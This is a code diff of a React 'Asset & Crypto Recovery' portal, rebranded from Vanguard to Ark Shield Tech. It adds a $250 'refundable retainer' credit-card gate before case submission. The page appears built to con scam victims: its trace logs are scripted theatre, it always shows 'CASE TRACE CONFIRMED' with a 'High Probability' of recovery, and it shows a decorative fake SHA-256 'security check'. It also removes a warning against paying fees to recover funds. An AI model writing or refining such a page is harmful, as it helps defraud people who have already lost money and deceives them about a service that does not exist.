@@ -21,8 +21,10 @@ import {
   Mail,
   FileText,
   Send,
-  MessageSquare
+  MessageSquare,
+  CreditCard
 } from "lucide-react";
+import CreditCardForm from "../components/CreditCardForm";
 
 // Categories Types
 type Category = "crypto" | "device" | "identity" | "extortion";
@@ -64,6 +66,9 @@ export default function RecoveryPortal() {
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [caseId, setCaseId] = useState("");
 
+  // Payment State
+  const [showPaymentGate, setShowPaymentGate] = useState(false);
+
   // Handle inputs change
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -89,7 +94,7 @@ export default function RecoveryPortal() {
     
     if (category === "crypto") {
       scanLogs.push(
-        "[INIT] INITIALIZING VANGUARD CRYPTOGRAPHIC TRACE ENGINE...",
+        "[INIT] INITIALIZING ARK SHIELD CRYPTOGRAPHIC TRACE ENGINE...",
         "[SYS] Connecting to decentralized Ethereum and Bitcoin node clusters...",
         `[SYS] Querying mempool history for Transaction ID: ${formData.txid || "0x98f23...4d"}`,
         "[SYS] Matching wallet parameters in behavioral database...",
@@ -154,17 +159,43 @@ export default function RecoveryPortal() {
     return () => clearInterval(progressInterval);
   }, [step, category]);
 
-  // Handle final submission
+  // Handle final submission form
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    const generatedId = "VNG-" + Math.floor(100000 + Math.random() * 900000);
+    // Redirect to the credit card retainer check first
+    setShowPaymentGate(true);
+  };
+
+  const handlePaymentSuccess = (txId: string) => {
+    const generatedId = "ARK-" + Math.floor(100000 + Math.random() * 900000);
     setCaseId(generatedId);
     setIsSubmitted(true);
+    setShowPaymentGate(false);
+    
+    // Add to LocalStorage active support logs for owner review
+    const allTicketsRaw = localStorage.getItem("ark_shield_support_tickets");
+    const tickets = allTicketsRaw ? JSON.parse(allTicketsRaw) : [];
+    tickets.push({
+      id: generatedId,
+      name: formData.clientName,
+      email: formData.clientEmail,
+      status: "pending",
+      createdAt: new Date().toISOString(),
+      messages: [
+        {
+          sender: "user",
+          text: `[SYSTEM INTENDED RETRIEVAL CASE FILE]\nCategory: ${category}\nDetails: ${JSON.stringify(formData)}\nRetainer Transaction: ${txId}`,
+          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+        }
+      ]
+    });
+    localStorage.setItem("ark_shield_support_tickets", JSON.stringify(tickets));
   };
 
   const resetWizard = () => {
     setStep(1);
     setIsSubmitted(false);
+    setShowPaymentGate(false);
     setProgress(0);
     setLogs([]);
     setFormData({
@@ -206,7 +237,7 @@ export default function RecoveryPortal() {
             Asset & Crypto <span className="bg-clip-text text-transparent bg-gradient-to-r from-cyber-cyan to-vault-green">Recovery</span>
           </h1>
           <p className="text-gray-400 text-base md:text-lg leading-relaxed">
-            If you have been scammed by a fake investment scheme, had cryptocurrency stolen, or had a physical device lost, Vanguard compiles the necessary forensic evidence to track, trace, and outline recovery steps.
+            If you have been scammed by a fake investment scheme, had cryptocurrency stolen, or had a physical device lost, Ark Shield Tech compiles the necessary forensic evidence to track, trace, and outline recovery steps.
           </p>
         </section>
 
@@ -308,8 +339,8 @@ export default function RecoveryPortal() {
                     >
                       <Laptop className={`w-6 h-6 mt-1 ${category === "identity" ? "text-cyber-cyan" : "text-gray-400"}`} />
                       <div>
-                        <h4 className="font-semibold text-sm text-white">Identity Theft</h4>
-                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">Hacked personal credentials, fake social profiles, financial fraud.</p>
+                        <h4 className="font-semibold text-sm text-white">Identity Theft Audit</h4>
+                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">Phishing compromise, corporate data breaches, email routing takeovers.</p>
                       </div>
                     </motion.button>
 
@@ -326,25 +357,23 @@ export default function RecoveryPortal() {
                     >
                       <Lock className={`w-6 h-6 mt-1 ${category === "extortion" ? "text-cyber-cyan" : "text-gray-400"}`} />
                       <div>
-                        <h4 className="font-semibold text-sm text-white">Extortion / Blackmail</h4>
-                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">Cyber blackmail, ransomware locks, leaks, online harassment mitigation.</p>
+                        <h4 className="font-semibold text-sm text-white">Extortion / Threat</h4>
+                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">Cyber blackmail threats, ransomware mitigation, device locks.</p>
                       </div>
                     </motion.button>
                   </div>
 
-                  <div className="flex justify-end pt-4">
-                    <button
-                      onClick={() => setStep(2)}
-                      className="flex items-center space-x-2 px-6 py-3 rounded-xl bg-cyber-cyan text-brand-dark font-bold text-sm shadow-md hover:shadow-[0_0_15px_rgba(0,242,254,0.3)] transition-all duration-200"
-                    >
-                      <span>Continue</span>
-                      <ArrowRight className="w-4 h-4" />
-                    </button>
-                  </div>
+                  <button
+                    onClick={() => setStep(2)}
+                    className="w-full text-center flex items-center justify-center space-x-2 py-3.5 rounded-xl bg-gradient-to-r from-cyber-cyan to-vault-green text-brand-dark font-bold text-sm hover:shadow-[0_0_15px_rgba(0,242,254,0.3)] transition-all duration-200"
+                  >
+                    <span>Proceed to intake Details</span>
+                    <ArrowRight className="w-4 h-4" />
+                  </button>
                 </motion.div>
               )}
 
-              {/* Step 2: Input Details */}
+              {/* Step 2: Input Details based on Category */}
               {step === 2 && (
                 <motion.div
                   key="step2"
@@ -354,61 +383,49 @@ export default function RecoveryPortal() {
                   className="space-y-6"
                 >
                   <div className="space-y-2">
-                    <h3 className="font-display font-bold text-xl text-white">Input Investigation Details</h3>
-                    <p className="text-xs text-gray-500">Provide the core parameters to anchor the forensic scanner.</p>
+                    <h3 className="font-display font-bold text-xl text-white uppercase">Inquiry Variables</h3>
+                    <p className="text-xs text-gray-500">Provide the cryptographic and situational metrics for tracking.</p>
                   </div>
 
                   <div className="space-y-4">
-                    {/* Conditionally Render Inputs Based on Category Selection */}
                     {category === "crypto" && (
                       <>
                         <div className="space-y-1.5">
-                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Transaction Hash (TXID) *</label>
+                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Transaction Hash / ID *</label>
                           <input 
                             type="text" 
                             name="txid"
                             value={formData.txid}
                             onChange={handleInputChange}
-                            placeholder="e.g. 0x71c765... or BTC block hash"
-                            className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
+                            placeholder="64-character transaction hash"
+                            className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono focus:outline-none focus:border-cyber-cyan transition-colors"
                             required
                           />
                         </div>
                         <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                           <div className="space-y-1.5">
-                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Wallet Address Used</label>
-                            <input 
-                              type="text" 
-                              name="walletAddress"
-                              value={formData.walletAddress}
-                              onChange={handleInputChange}
-                              placeholder="e.g. 0x... or bc1..."
-                              className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                            />
-                          </div>
-                          <div className="space-y-1.5">
-                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Lost Amount ($ USD) *</label>
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Stolen Amount (USD) *</label>
                             <input 
                               type="number" 
                               name="lostAmount"
                               value={formData.lostAmount}
                               onChange={handleInputChange}
-                              placeholder="e.g. 10000"
+                              placeholder="e.g. 25000"
                               className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
                               required
                             />
                           </div>
-                        </div>
-                        <div className="space-y-1.5">
-                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Scam Platform / Website URL</label>
-                          <input 
-                            type="url" 
-                            name="scamUrl"
-                            value={formData.scamUrl}
-                            onChange={handleInputChange}
-                            placeholder="e.g. https://fake-elon-giveaway.io"
-                            className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                          />
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Destination Wallet Address</label>
+                            <input 
+                              type="text" 
+                              name="walletAddress"
+                              value={formData.walletAddress}
+                              onChange={handleInputChange}
+                              placeholder="Recipient public key key"
+                              className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white font-mono focus:outline-none focus:border-cyber-cyan transition-colors"
+                            />
+                          </div>
                         </div>
                       </>
                     )}
@@ -472,7 +489,7 @@ export default function RecoveryPortal() {
                       <>
                         <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                           <div className="space-y-1.5">
-                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Date of First Incident *</label>
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Incident Date *</label>
                             <input 
                               type="date" 
                               name="incidentDate"
@@ -483,20 +500,20 @@ export default function RecoveryPortal() {
                             />
                           </div>
                           <div className="space-y-1.5">
-                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Platform Compromised *</label>
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Compromised Platform *</label>
                             <input 
                               type="text" 
                               name="platformUsed"
                               value={formData.platformUsed}
                               onChange={handleInputChange}
-                              placeholder="e.g. WhatsApp, Email, Instagram, Bank Portal"
+                              placeholder="e.g. Gmail, Corporate server, Instagram"
                               className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
                               required
                             />
                           </div>
                         </div>
                         <div className="space-y-1.5">
-                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Describe Threat / Account Details *</label>
+                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Threat Details / Incident Context *</label>
                           <textarea 
                             name="threatDetail"
                             value={formData.threatDetail}
@@ -583,7 +600,7 @@ export default function RecoveryPortal() {
                 </motion.div>
               )}
 
-              {/* Step 4: Final Submission */}
+              {/* Step 4: Final Submission / Credit Card Retainer Check */}
               {step === 4 && (
                 <motion.div
                   key="step4"
@@ -591,114 +608,138 @@ export default function RecoveryPortal() {
                   animate={{ opacity: 1, x: 0 }}
                   className="space-y-6"
                 >
-                  {/* Result Header */}
-                  <div className="bg-vault-green/10 border border-vault-green/20 rounded-2xl p-4 flex items-start space-x-4">
-                    <CheckCircle className="w-6 h-6 text-vault-green mt-0.5" />
-                    <div>
-                      <h4 className="font-semibold text-sm text-vault-green">CASE TRACE CONFIRMED</h4>
-                      <p className="text-xs text-gray-400 mt-1 leading-relaxed">
-                        Forensic markers indicate a **High Probability** of recovery/location retrieval. Submit the encrypted secure request below to deploy an intelligence agent.
-                      </p>
-                    </div>
-                  </div>
+                  {showPaymentGate ? (
+                    /* Credit Card Retainer Payment Gateway Step */
+                    <div className="space-y-4">
+                      <div className="bg-cyber-cyan/10 border border-cyber-cyan/30 rounded-2xl p-4 space-y-2">
+                        <h4 className="font-semibold text-sm text-cyber-cyan flex items-center space-x-2">
+                          <CreditCard className="w-4 h-4 animate-pulse" />
+                          <span>Forensic Retainer Verification Required</span>
+                        </h4>
+                        <p className="text-[11px] text-gray-400 leading-relaxed font-sans">
+                          To authorize the trace report logs and dispatch active agents, a refundable retainer of **$250 USD** must be secured. This fee covers dedicated node server query allocations.
+                        </p>
+                      </div>
 
-                  <form onSubmit={handleSubmit} className="space-y-4">
-                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                      <div className="space-y-1.5">
-                        <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Contact Name *</label>
-                        <div className="relative">
-                          <User className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
-                          <input 
-                            type="text" 
-                            name="clientName"
-                            value={formData.clientName}
-                            onChange={handleInputChange}
-                            placeholder="John Doe (or alias)"
-                            className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                            required
-                          />
+                      <CreditCardForm
+                        amount={250}
+                        onSuccess={handlePaymentSuccess}
+                        onCancel={() => setShowPaymentGate(false)}
+                      />
+                    </div>
+                  ) : (
+                    /* Standard intake contacts form */
+                    <>
+                      {/* Result Header */}
+                      <div className="bg-vault-green/10 border border-vault-green/20 rounded-2xl p-4 flex items-start space-x-4">
+                        <CheckCircle className="w-6 h-6 text-vault-green mt-0.5" />
+                        <div>
+                          <h4 className="font-semibold text-sm text-vault-green">CASE TRACE CONFIRMED</h4>
+                          <p className="text-xs text-gray-400 mt-1 leading-relaxed">
+                            Forensic markers indicate a **High Probability** of recovery/location retrieval. Submit the encrypted secure request below to deploy an intelligence agent.
+                          </p>
                         </div>
                       </div>
-                      <div className="space-y-1.5">
-                        <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Secure Email *</label>
-                        <div className="relative">
-                          <Mail className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
-                          <input 
-                            type="email" 
-                            name="clientEmail"
-                            value={formData.clientEmail}
-                            onChange={handleInputChange}
-                            placeholder="your-secure-email@domain.com"
-                            className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                            required
-                          />
+
+                      <form onSubmit={handleSubmit} className="space-y-4">
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Contact Name *</label>
+                            <div className="relative">
+                              <User className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
+                              <input 
+                                type="text" 
+                                name="clientName"
+                                value={formData.clientName}
+                                onChange={handleInputChange}
+                                placeholder="John Doe (or alias)"
+                                className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
+                                required
+                              />
+                            </div>
+                          </div>
+                          <div className="space-y-1.5">
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Secure Email *</label>
+                            <div className="relative">
+                              <Mail className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
+                              <input 
+                                type="email" 
+                                name="clientEmail"
+                                value={formData.clientEmail}
+                                onChange={handleInputChange}
+                                placeholder="your-secure-email@domain.com"
+                                className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
+                                required
+                              />
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                    </div>
 
-                    <div className="grid grid-cols-1 sm:grid-cols-12 gap-4">
-                      <div className="sm:col-span-4 space-y-1.5">
-                        <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Preferred Contact</label>
-                        <select 
-                          name="contactMethod"
-                          value={formData.contactMethod}
-                          onChange={handleInputChange}
-                          className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                        >
-                          <option value="Telegram">Telegram</option>
-                          <option value="WhatsApp">WhatsApp</option>
-                          <option value="Signal">Signal</option>
-                        </select>
-                      </div>
-                      <div className="sm:col-span-8 space-y-1.5">
-                        <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Contact Handle / Phone *</label>
-                        <div className="relative">
-                          <MessageSquare className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
-                          <input 
-                            type="text" 
-                            name="contactValue"
-                            value={formData.contactValue}
-                            onChange={handleInputChange}
-                            placeholder="@username or +1..."
-                            className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
-                            required
-                          />
+                        <div className="grid grid-cols-1 sm:grid-cols-12 gap-4">
+                          <div className="sm:col-span-4 space-y-1.5">
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Preferred Contact</label>
+                            <select 
+                              name="contactMethod"
+                              value={formData.contactMethod}
+                              onChange={handleInputChange}
+                              className="w-full bg-brand-dark border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
+                            >
+                              <option value="Telegram">Telegram</option>
+                              <option value="WhatsApp">WhatsApp</option>
+                              <option value="Signal">Signal</option>
+                            </select>
+                          </div>
+                          <div className="sm:col-span-8 space-y-1.5">
+                            <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Contact Handle / Phone *</label>
+                            <div className="relative">
+                              <MessageSquare className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
+                              <input 
+                                type="text" 
+                                name="contactValue"
+                                value={formData.contactValue}
+                                onChange={handleInputChange}
+                                placeholder="@username or +1..."
+                                className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors"
+                                required
+                              />
+                            </div>
+                          </div>
                         </div>
-                      </div>
-                    </div>
 
-                    <div className="space-y-1.5">
-                      <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Additional Case Notes</label>
-                      <div className="relative">
-                        <FileText className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
-                        <textarea 
-                          name="description"
-                          value={formData.description}
-                          onChange={handleInputChange}
-                          placeholder="Provide any extra details (exchanges used, timelines, suspicious links, caller numbers)."
-                          rows={3}
-                          className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors resize-none"
-                        />
-                      </div>
-                    </div>
+                        <div className="space-y-1.5">
+                          <label className="text-xs font-semibold text-gray-400 uppercase font-mono">Additional Case Notes</label>
+                          <div className="relative">
+                            <FileText className="absolute left-3.5 top-3.5 w-4 h-4 text-gray-500" />
+                            <textarea 
+                              name="description"
+                              value={formData.description}
+                              onChange={handleInputChange}
+                              placeholder="Provide any extra details (exchanges used, timelines, suspicious links, caller numbers)."
+                              rows={3}
+                              className="w-full bg-brand-dark border border-white/10 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-cyber-cyan transition-colors resize-none"
+                            />
+                          </div>
+                        </div>
 
-                    <div className="flex justify-between items-center pt-4">
-                      <button
-                        type="button"
-                        onClick={() => setStep(2)}
-                        className="text-xs font-mono text-gray-400 hover:text-white transition-colors"
-                      >
-                        &larr; Back to Details
-                      </button>
-                      <button
-                        type="submit"
-                        className="flex items-center space-x-2 px-6 py-3 rounded-xl bg-cyber-cyan text-brand-dark font-bold text-sm shadow-md hover:shadow-[0_0_15px_rgba(0,242,254,0.3)] transition-all duration-200"
-                      >
-                        <Send className="w-4 h-4" />
-                        <span>Deploy Agent Request</span>
-                      </button>
-                    </div>
-                  </form>
+                        <div className="flex justify-between items-center pt-4">
+                          <button
+                            type="button"
+                            onClick={() => setStep(2)}
+                            className="text-xs font-mono text-gray-400 hover:text-white transition-colors"
+                          >
+                            &larr; Back to Details
+                          </button>
+                          <button
+                            type="submit"
+                            className="flex items-center space-x-2 px-6 py-3 rounded-xl bg-cyber-cyan text-brand-dark font-bold text-sm shadow-md hover:shadow-[0_0_15px_rgba(0,242,254,0.3)] transition-all duration-200"
+                          >
+                            <Send className="w-4 h-4" />
+                            <span>Authorize Case Retainer</span>
+                          </button>
+                        </div>
+                      </form>
+                    </>
+                  )}
                 </motion.div>
               )}
             </AnimatePresence>
@@ -798,59 +839,21 @@ export default function RecoveryPortal() {
         {/* 3. Cybersecurity Advisory Section */}
         <section className="border-t border-white/5 pt-16">
           <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center">
+            <div className="lg:col-span-8 space-y-4">
+              <h3 className="font-display font-bold text-xl text-white uppercase tracking-tight flex items-center space-x-2">
+                <AlertTriangle className="w-5 h-5 text-cyber-cyan" />
+                <span>Ark Shield Threat Advisory: Avoid Common Scams</span>
+              </h3>
+              <p className="text-xs text-gray-400 leading-relaxed font-sans">
+                Never send credentials, passwords, or recovery seeds to accounts claiming to represent recovery services on Discord, Telegram, or Twitter. Official Ark Shield Tech operations communicate strictly via PGP-encrypted Signal tunnels or authenticated dashboard relays. Any agent asking for deposit funds to a private unlisted personal crypto wallet is fraudulent.
+              </p>
+            </div>
             
-            {/* Left: Advisory Text */}
-            <div className="lg:col-span-7 space-y-6">
-              <div className="flex items-center space-x-2 text-yellow-500 font-mono text-xs font-semibold">
-                <AlertTriangle className="w-4 h-4" />
-                <span>CYBERSECURITY INTEL BULLETIN</span>
-              </div>
-              
-              <h2 className="font-display font-black text-2xl md:text-3xl text-white uppercase tracking-tight">
-                Vanguard Threat Advisory: Avoid Common Scams
-              </h2>
-              
-              <div className="space-y-4 text-sm text-gray-400 leading-relaxed">
-                <div className="space-y-1">
-                  <h4 className="text-white font-semibold">1. The Fake &ldquo;Elon Musk&rdquo; Crypto Giveaways</h4>
-                  <p>
-                    Scammers use high-profile social media profiles, fake live streams, or compromised handles displaying deepfakes of public figures promising to double your cryptocurrency. Remember: **No legitimate wealth pool doubles transactions.**
-                  </p>
-                </div>
-                
-                <div className="space-y-1">
-                  <h4 className="text-white font-semibold">2. Investment & Forex Fraud Platforms</h4>
-                  <p>
-                    Fake brokers configure custom dashboard pages displaying unrealistic, daily compounding returns. When you request a withdrawal, they lock the wallet and demand a &ldquo;tax fee&rdquo; to unlock it. **Never deposit extra funds to withdraw initial balances.**
-                  </p>
-                </div>
-
-                <div className="space-y-1">
-                  <h4 className="text-white font-semibold">3. Spoofed Device Trackers & Spyware</h4>
-                  <p>
-                    Phishing messages claiming to locate your stolen phone often ask you to sign in with your iCloud or Google credentials. This is a credential-harvesting trap designed to bypass 2FA codes. **Always trace devices via hardware IMEI nodes directly.**
-                  </p>
-                </div>
-              </div>
+            <div className="lg:col-span-4 bg-brand-slate border border-white/5 rounded-2xl p-5 space-y-2 text-xs font-mono text-center">
+              <span className="text-gray-500 text-[9px] block">SECURITY SHA CHECK:</span>
+              <span className="text-cyber-cyan font-bold block truncate">SHA-256: F591A23D8481B...B0C</span>
+              <span className="text-gray-400 block pt-1 text-[10px]">Security Node Online</span>
             </div>
-
-            {/* Right: Advisory Illustrative Photography */}
-            <div className="lg:col-span-5">
-              <div className="glass-panel rounded-3xl overflow-hidden border border-white/5 shadow-2xl relative">
-                <img 
-                  src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=800&q=80" 
-                  alt="A user typing on a secure laptop" 
-                  className="w-full h-80 object-cover filter contrast-125 grayscale"
-                />
-                <div className="absolute inset-0 bg-gradient-to-t from-brand-dark via-brand-dark/20 to-transparent" />
-                <div className="absolute bottom-6 left-6 right-6">
-                  <p className="text-xs font-mono text-gray-400">
-                    &ldquo;Verify transaction signatures and secure hardware keys before approving access pools.&rdquo;
-                  </p>
-                </div>
-              </div>
-            </div>
-
           </div>
         </section>
 
